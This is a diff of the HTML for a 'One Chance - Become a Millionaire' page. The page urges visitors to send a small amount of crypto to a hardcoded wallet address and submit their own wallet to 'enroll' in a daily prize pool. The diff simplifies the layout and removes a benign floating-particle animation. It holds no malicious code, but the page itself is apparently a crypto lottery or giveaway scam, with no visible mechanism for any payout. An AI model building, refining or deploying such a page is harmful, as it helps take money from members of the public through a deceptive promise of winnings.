@@ -2,50 +2,30 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>One Chance</title>
   <link rel="stylesheet" href="style.css" />
-  <link href="https://fonts.googleapis.com/css2?family=Baloo+2&display=swap" rel="stylesheet">
 </head>
 <body>
-  <div class="container">
-    <h1>🌸 One Chance - Become a Millionaire</h1>
-    <p class="intro">Inspired by the spirit of giving 🌈</p>
+  <!-- Sakura petals container -->
+  <div id="sakura-container"></div>
 
-    <div class="card-section">
-      <h2>✨ How It Works</h2>
-      <div class="scroll-cards">
-        <div class="card">
-          <img src="https://via.placeholder.com/200x120?text=Bathhouse" alt="Bathhouse" />
-          <p><strong>What is One Chance?</strong><br />A magical crypto pool to change a life daily.</p>
-        </div>
-        <div class="card">
-          <img src="https://via.placeholder.com/200x120?text=Soot+Sprite" alt="Sprite" />
-          <p><strong>Just $1</strong><br />Millions giving a little can create real magic.</p>
-        </div>
-        <div class="card">
-          <img src="https://via.placeholder.com/200x120?text=Forest" alt="Forest" />
-          <p><strong>No Wallet App</strong><br />Just copy the address, send, and enter.</p>
-        </div>
-        <div class="card">
-          <img src="https://via.placeholder.com/200x120?text=Sky" alt="Sky" />
-          <p><strong>Daily Winners</strong><br />Announced at 8PM UTC daily.</p>
-        </div>
-      </div>
-    </div>
+  <div class="container">
+    <h1>🚀 One Chance - Become a Millionaire</h1>
+    <p>Send a tiny amount of crypto to get a chance to win it all.</p>
 
     <div class="enroll-section">
-      <h3>🪙 Step 1: Send a tiny donation to:</h3>
+      <p><strong>Step 1:</strong> Send minimum 0.001 ETH/BNB/BTC/PI to:</p>
       <div class="wallet">
         <input id="walletAddress" value="0x6f7BB151D8fF02CccdF183917B8aDD81215d1266" readonly />
         <button onclick="copyWallet()">📋 Copy Address</button>
       </div>
 
-      <h3>💼 Step 2: Enter your wallet address</h3>
-      <input id="userWallet" placeholder="e.g. 0x..." />
+      <p><strong>Step 2:</strong> Enter your wallet address:</p>
+      <input id="userWallet" placeholder="Enter your wallet..." />
 
-      <h3>✅ Step 3: Tap to Enroll</h3>
-      <button onclick="enroll()">🌠 Enroll in Pool</button>
+      <p><strong>Step 3:</strong> Click Enroll</p>
+      <button onclick="enroll()">✅ Enroll in Pool</button>
 
       <p id="message"></p>
     </div>
@@ -57,56 +37,5 @@
 
   <script src="confetti.js"></script>
   <script src="script.js"></script>
-
-  <!-- Spirit Particle Canvas -->
-<canvas id="spiritCanvas"></canvas>
-
-<script>
-// Floating spirits animation
-const canvas = document.getElementById('spiritCanvas');
-const ctx = canvas.getContext('2d');
-canvas.width = window.innerWidth;
-canvas.height = window.innerHeight;
-canvas.style.position = 'fixed';
-canvas.style.top = '0';
-canvas.style.left = '0';
-canvas.style.zIndex = '-1';
-canvas.style.pointerEvents = 'none';
-canvas.style.opacity = '0.4';
-
-let spirits = [];
-
-function createSpirit() {
-  return {
-    x: Math.random() * canvas.width,
-    y: canvas.height + 10,
-    size: Math.random() * 6 + 2,
-    speed: Math.random() * 1 + 0.5
-  };
-}
-
-for (let i = 0; i < 50; i++) {
-  spirits.push(createSpirit());
-}
-
-function drawSpirits() {
-  ctx.clearRect(0, 0, canvas.width, canvas.height);
-  for (let spirit of spirits) {
-    ctx.beginPath();
-    ctx.fillStyle = 'rgba(0,0,0,0.3)';
-    ctx.arc(spirit.x, spirit.y, spirit.size, 0, Math.PI * 2);
-    ctx.fill();
-    spirit.y -= spirit.speed;
-    if (spirit.y < -10) {
-      Object.assign(spirit, createSpirit());
-      spirit.y = canvas.height + 10;
-    }
-  }
-  requestAnimationFrame(drawSpirits);
-}
-
-drawSpirits();
-</script>
-
 </body>
 </html>
